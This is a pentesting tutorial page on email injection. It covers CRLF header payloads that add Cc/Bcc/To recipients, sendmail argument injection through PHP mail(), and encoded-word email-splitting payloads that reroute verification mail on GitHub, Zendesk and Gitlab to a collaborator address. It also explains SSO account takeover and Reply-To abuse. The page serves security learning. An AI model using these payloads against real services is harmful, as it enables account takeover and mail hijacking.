<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Email Injections | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-email-injections/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Email Injections</h1> <p class="post-description"></p> </header> <article> <h1 id="email-injections">Email Injections</h1> <h2 id="inject-in-sent-e-mail">Inject in sent e-mail</h2> <h3 id="inject-cc-and-bcc-after-sender-argument">Inject Cc and Bcc after sender argument</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
</code></pre></div></div> <p>The message will be sent to the recipient and recipient1 accounts.</p> <h3 id="inject-argument">Inject argument</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From:sender@domain.com%0ATo:attacker@domain.com
</code></pre></div></div> <p>The message will be sent to the original recipient and the attacker account.</p> <h3 id="inject-subject-argument">Inject Subject argument</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From:sender@domain.com%0ASubject:This is%20Fake%20Subject
</code></pre></div></div> <p>The fake subject will be added to the original subject and in some cases will replace it. It depends on the mail service behavior.</p> <h3 id="change-the-body-of-the-message">Change the body of the message</h3> <p>Inject a two-line feed, then write your message to change the body of the message.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
</code></pre></div></div> <h3 id="php-mail-function-exploitation">PHP mail() function exploitation</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The function has the following definition:</span>

php <span class="nt">--rf</span> mail

Function <span class="o">[</span> &lt;internal:standard&gt; <span class="k">function </span>mail <span class="o">]</span> <span class="o">{</span>
  - Parameters <span class="o">[</span>5] <span class="o">{</span>
    Parameter <span class="c">#0 [ &lt;required&gt; $to ]</span>
    Parameter <span class="c">#1 [ &lt;required&gt; $subject ]</span>
    Parameter <span class="c">#2 [ &lt;required&gt; $message ]</span>
    Parameter <span class="c">#3 [ &lt;optional&gt; $additional_headers ]</span>
    Parameter <span class="c">#4 [ &lt;optional&gt; $additional_parameters ]</span>
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div> <h4 id="the-5th-parameter-additional_parameters">The 5th parameter ($additional_parameters)</h4> <p>This section is going to be based on <strong>how to abuse this parameter supposing that an attacker controls it</strong>.</p> <p>This parameter is going to be added to the command line PHP will be using to invoke the binary sendmail. However, it will be sanitised with the function <code class="language-plaintext highlighter-rouge">escapeshellcmd($additional_parameters)</code>.</p> <p>An attacker can <strong>inject extract parameters for sendmail</strong> in this case.</p> <h4 id="differences-in-the-implementation-of-usrsbinsendmail">Differences in the implementation of /usr/sbin/sendmail</h4> <p><strong>sendmail</strong> interface is <strong>provided by the MTA email software</strong> (Sendmail, Postfix, Exim etc.) installed on the system. Although the <strong>basic functionality</strong> (such as -t -i -f parameters) remains the <strong>same</strong> for compatibility reasons, <strong>other functions and parameters</strong> vary greatly depending on the MTA installed.</p> <p>Here are a few examples of different man pages of sendmail command/interface:</p> <ul> <li>Sendmail MTA: http://www.sendmail.org/~ca/email/man/sendmail.html</li> <li>Postfix MTA: http://www.postfix.org/mailq.1.html</li> <li>Exim MTA: https://linux.die.net/man/8/eximReferences</li> </ul> <p>Depending on the <strong>origin of the sendmail</strong> binary different options have been discovered to abuse them and l<strong>eak files or even execute arbitrary commands</strong>. Check how in <a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" rel="external nofollow noopener" target="_blank"><strong>https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</strong></a></p> <h2 id="inject-in-the-e-mail-name">Inject in the e-mail name</h2> <blockquote> <p>[!CAUTION] Note that if you manage to create an account in a service with an arbitrary domain name (like Github, Gitlab, CloudFlare Zero trust…) and verify it receiving the verification email in your mail address, you might be able to access sensitive locations of the victim company</p> </blockquote> <h3 id="ignored-parts-of-an-email">Ignored parts of an email</h3> <p>The symbols: <strong>+, -</strong> and <strong>{}</strong> in rare occasions can be used for tagging and ignored by most e-mail servers</p> <ul> <li>E.g. john.doe+intigriti@example.com → john.doe@example.com</li> </ul> <p><strong>Comments between parentheses ()</strong> at the beginning or the end will also be ignored</p> <ul> <li>E.g. john.doe(intigriti)@example.com → john.doe@example.com</li> </ul> <h3 id="whitelist-bypass">Whitelist bypass</h3> <figure><img src="../images/image%20(812).png" alt="https://www.youtube.com/watch?app=desktop&amp;v=4ZsTKvfP1g0"><figcaption></figcaption></figure> <h3 id="quotes">Quotes</h3> <figure><img src="../images/image%20(626).png" alt="https://www.youtube.com/watch?app=desktop&amp;v=4ZsTKvfP1g0"><figcaption></figcaption></figure> <h3 id="ips">IPs</h3> <p>You can also use IPs as domain named between square brackets:</p> <ul> <li>john.doe@[127.0.0.1]</li> <li>john.doe@[IPv6:2001:db8::1]</li> </ul> <h3 id="email-encoding">Email Encoding</h3> <p>As explained in <a href="https://portswigger.net/research/splitting-the-email-atom" rel="external nofollow noopener" target="_blank"><strong>this research</strong></a>, email names also can also contain encoded characters:</p> <ul> <li> <strong>PHP 256 overflow</strong>: PHP <code class="language-plaintext highlighter-rouge">chr</code> function will continue adding 256 to a char until it becames positive and then do the operation <code class="language-plaintext highlighter-rouge">%256</code>. <ul> <li><code class="language-plaintext highlighter-rouge">String.fromCodePoint(0x10000 + 0x40) // 𐁀 → @</code></li> </ul> </li> </ul> <blockquote> <p>[!TIP] The goal of this trick is to end with an injection like <code class="language-plaintext highlighter-rouge">RCPT TO:&lt;"collab@psres.net&gt;collab"@example.com&gt;</code><br> that will send the verification email to a different email address from the expected one (therefore to introduce another email address inside the email name and break the syntax when sending the email)</p> </blockquote> <p>Different encodings:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Format</span>
<span class="o">=</span>? utf-8 ? q ? <span class="o">=</span><span class="nv">41</span><span class="o">=</span><span class="nv">42</span><span class="o">=</span>43 ?<span class="o">=</span> hi@example.com <span class="nt">--</span><span class="o">&gt;</span> ABChi@example.com

<span class="c"># =? -&gt; Start of encode</span>
<span class="c"># utf-8 -&gt; encoding used</span>
<span class="c"># ? -&gt; separator</span>
<span class="c"># q -&gt; type of encoding</span>
<span class="c"># ? -&gt; separator</span>
<span class="c"># =41=42=43 -&gt; Hex encoded data</span>
<span class="c"># ?= end of encoding</span>

<span class="c"># Other encodings, same example:</span>
<span class="c"># iso-8859-1</span>
<span class="o">=</span>?iso-8859-1?q?<span class="o">=</span><span class="nv">61</span><span class="o">=</span><span class="nv">62</span><span class="o">=</span>63?<span class="o">=</span>hi@example.com
<span class="c"># utf-8</span>
<span class="o">=</span>?utf-8?q?<span class="o">=</span><span class="nv">61</span><span class="o">=</span><span class="nv">62</span><span class="o">=</span>63?<span class="o">=</span>hi@example.com
<span class="c"># utf-7</span>
<span class="o">=</span>?utf-7?q?&lt;utf-7 encoded string&gt;?<span class="o">=</span>hi@example.com
<span class="c"># q encoding + utf-7</span>
<span class="o">=</span>?utf-7?q?&amp;<span class="o">=</span>41&lt;utf-7 encoded string without initial A&gt;?<span class="o">=</span>hi@example.com
<span class="c"># base64</span>
<span class="o">=</span>?utf-8?b?QUJD?<span class="o">=</span>hi@example.com
<span class="c"># bas64 + utf-7</span>
<span class="o">=</span>?utf-7?q?&lt;utf-7 encoded string <span class="k">in </span><span class="nb">base64</span><span class="o">&gt;</span>?<span class="o">=</span>hi@example.com
<span class="c">#punycode</span>
x@xn--svg/-9x6 → x@&lt;svg/
</code></pre></div></div> <p>Payloads:</p> <ul> <li>Github: <code class="language-plaintext highlighter-rouge">=?x?q?collab=40psres.net=3e=00?=foo@example.com</code> <ul> <li>Note the encoded <code class="language-plaintext highlighter-rouge">@</code> as =40, the encoded <code class="language-plaintext highlighter-rouge">&gt;</code> as <code class="language-plaintext highlighter-rouge">=3e</code> and <code class="language-plaintext highlighter-rouge">null</code> as <code class="language-plaintext highlighter-rouge">=00</code> </li> <li>It’ll send the verification email to <code class="language-plaintext highlighter-rouge">collab@psres.net</code> </li> </ul> </li> <li>Zendesk: <code class="language-plaintext highlighter-rouge">"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com</code> <ul> <li>Same trick as before but adding some regular quote at the beginning and encoded qoute <code class="language-plaintext highlighter-rouge">=22</code> before the encoded <code class="language-plaintext highlighter-rouge">@</code> and then starting and close some qoutes before the next email to fix the syntax used internally by Zendesk</li> <li>It’ll send the verification email to <code class="language-plaintext highlighter-rouge">collab@psres.net</code> </li> </ul> </li> <li>Gitlab: <code class="language-plaintext highlighter-rouge">=?x?q?collab=40psres.net_?=foo@example.com</code> <ul> <li>Note the use of the underscore as a space to separate address</li> <li>It’ll send the verification email to <code class="language-plaintext highlighter-rouge">collab@psres.net</code> </li> </ul> </li> <li>Punycode: Using Punycode it was possible to inject a tag <code class="language-plaintext highlighter-rouge">&lt;style</code> in Joomla and abuse it to steal the CSRF token via CSS exfiltration.</li> </ul> <h4 id="tooling">Tooling</h4> <ul> <li>There is a <strong>Burp Suite Turbo Intruder script</strong> to fuzz these kind of combinations to try to attack email formats. The script already have potentially working combinations.</li> <li>It’s laso possible to use <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" rel="external nofollow noopener" target="_blank">Hackvertor</a> to create an email splitting attack</li> </ul> <h3 id="other-vulns">Other vulns</h3> <p><img src="../images/image%20(1131).png" alt="https://www.youtube.com/watch?app=desktop&amp;v=4ZsTKvfP1g0"></p> <h2 id="third-party-sso">Third party SSO</h2> <h3 id="xss">XSS</h3> <p>Some services like <strong>github</strong> or <strong>salesforce allows</strong> you to create an <strong>email address with XSS payloads on it</strong>. If you can <strong>use this providers to login on other services</strong> and this services <strong>aren’t sanitising</strong> correctly the email, you could cause <strong>XSS</strong>.</p> <h3 id="account-takeover">Account-Takeover</h3> <p>If a <strong>SSO service</strong> allows you to <strong>create an account without verifying the given email address</strong> (like <strong>salesforce</strong>) and then you can use that account to <strong>login in a different service</strong> that <strong>trusts</strong> salesforce, you could access any account.<br> <em>Note that salesforce indicates if the given email was or not verified but so the application should take into account this info.</em></p> <h2 id="reply-to">Reply-To</h2> <p>You can send an email using <em><strong>From: company.com</strong></em> and <em><strong>Replay-To: attacker.com</strong></em> and if any <strong>automatic reply</strong> is sent due to the email was sent <strong>from</strong> an <strong>internal address</strong> the <strong>attacker</strong> may be able to <strong>receive</strong> that <strong>response</strong>.</p> <h2 id="hard-bounce-rate">Hard Bounce Rate</h2> <p>Certain services, like AWS, implement a threshold known as the <strong>Hard Bounce Rate</strong>, typically set at 10%. This is a critical metric, especially for email delivery services. When this rate is exceeded, the service, such as AWS’s email service, may be suspended or blocked.</p> <p>A <strong>hard bounce</strong> refers to an <strong>email</strong> that has been returned to the sender because the recipient’s address is invalid or non-existent. This could occur due to various reasons, such as the <strong>email</strong> being sent to a non-existing address, a domain that isn’t real, or the recipient server’s refusal to accept <strong>emails</strong>.</p> <p>In the context of AWS, if you send 1000 emails and 100 of them result in hard bounces (due to reasons like invalid addresses or domains), this would mean a 10% hard bounce rate. Reaching or exceeding this rate can trigger AWS SES (Simple Email Service) to block or suspend your email sending capabilities.</p> <p>It’s crucial to maintain a low hard bounce rate to ensure uninterrupted email service and maintain sender reputation. Monitoring and managing the quality of the email addresses in your mailing lists can significantly help in achieving this.</p> <p>For more detailed information, AWS’s official documentation on handling bounces and complaints can be referred to <a href="https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types" rel="external nofollow noopener" target="_blank">AWS SES Bounce Handling</a>.</p> <h2 id="references">References</h2> <ul> <li><a href="https://resources.infosecinstitute.com/email-injection/" rel="external nofollow noopener" target="_blank">https://resources.infosecinstitute.com/email-injection/</a></li> <li><a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" rel="external nofollow noopener" target="_blank">https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</a></li> <li><a href="https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view" rel="external nofollow noopener" target="_blank">https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view</a></li> <li><a href="https://www.youtube.com/watch?app=desktop&amp;v=4ZsTKvfP1g0" rel="external nofollow noopener" target="_blank">https://www.youtube.com/watch?app=desktop\&amp;v=4ZsTKvfP1g0</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>